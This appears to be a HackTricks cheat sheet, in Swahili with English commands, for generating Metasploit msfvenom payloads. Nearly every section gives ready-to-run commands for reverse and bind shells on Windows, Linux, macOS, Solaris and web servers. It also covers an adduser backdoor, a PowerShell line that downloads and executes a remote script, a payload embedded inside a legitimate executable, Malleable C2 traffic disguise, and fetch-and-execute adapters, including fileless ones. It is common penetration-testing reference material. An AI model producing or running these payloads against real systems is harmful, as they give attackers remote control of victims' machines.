# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Misingi ya msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Tumia `-a` kuchagua usanifu wa payload na `--platform` kuchagua platform inayolengwa.<sup>[[1]](#references)</sup>

## Orodha
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Amri hizi huorodhesha payload na encoder modules zinazopatikana katika framework iliyosakinishwa.<sup>[[1]](#references)</sup>

## Parameta za kawaida wakati wa kuunda shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Alama zinazoonyeshwa hapa huchagua vibambo visivyofaa, umbizo la matokeo, encoder, na marudio ya encoding.<sup>[[1]](#references)</sup>

## Usawazishaji wa trafiki ya HTTP(S) ya Meterpreter

Metasploit 6.5 iliongeza chaguo la `MALLEABLEC2` kwenye payloads za staged na stageless reverse HTTP(S) Meterpreter. Wasifu unaweza kubadilisha URIs, user agents, vichwa vya request/response, uwekaji wa connection-ID na encodings/wrappers za body zinazotumika. Payload iliyozalishwa na handler yake lazima zipakie **wasifu uleule wa ndani**. Request ya awali ya payload ya staged ya kuomba Meterpreter stage haifanyiwi shaping, hivyo pendelea payload ya stageless kama `windows/x64/meterpreter_reverse_https` wakati request ya kwanza lazima pia ilingane na wasifu.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Sanidi matching handler kwa payload na profile zinazofanana:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Ni directives zilizowekwa kama implemented pekee ndizo zinazoathiri trafiki; profile blocks zisizoungwa mkono zinaweza kufanyiwa parse kwa mafanikio lakini zisiwe na athari yoyote.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Unda Mtumiaji
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Tekeleza Amri**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding si AV evasion:** encoders kama `x86/shikata_ga_nai` hutumika hasa kutimiza masharti ya bad-character. Encoding inayorudiwa si mbinu ya kuaminika ya AV-evasion.<sup>[[1]](#references)</sup>

### Iliyopachikwa ndani ya executable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Payloads za Linux

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Mizigo inayotegemea Wavuti**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads za Lugha za Script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads hutengeneza command inayofanya utility inayopatikana kwenye target kupakua na kutekeleza native payload ya msingi. Majina yao hufuata `cmd/<platform>/<fetch-protocol>/<served-payload>`; adapters za HTTP(S), SMB na TFTP zinapatikana, huku chaguo za downloader zikitegemea platform ya target.<sup>[[2]](#references)</sup>

Kwa mfano, tengeneza command ya Linux `wget` inayopata payload ya x64 Meterpreter kutoka port 8080 na kuunganisha tena kwenye port 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Anzisha **fetch handler** kwa mipangilio ileile; ina-host ELF iliyotengenezwa na pia inaanzisha handler kwa payload ya Meterpreter inayotolewa:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Chaguo tegemezi muhimu zinajumuisha `FETCH_PIPE=true` ili kutoa amri fupi ya HTTP(S) inapoungwa mkono, na `FETCH_FILELESS=shell`, `shell-search`, au `python3.8+` ili kutekeleza Linux ELF kutoka kwenye file descriptor isiyojulikana. Fileless modes zinahitaji Linux kernel 3.17 au ya baadaye; kagua adapter halisi kwa `msfvenom -p <FETCH_PAYLOAD> --list-options` kwa sababu mchanganyiko unaoungwa mkono hutofautiana.<sup>[[2]](#references)</sup>



## References

- [1] [Jinsi ya kutumia msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Jinsi ya kutumia Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
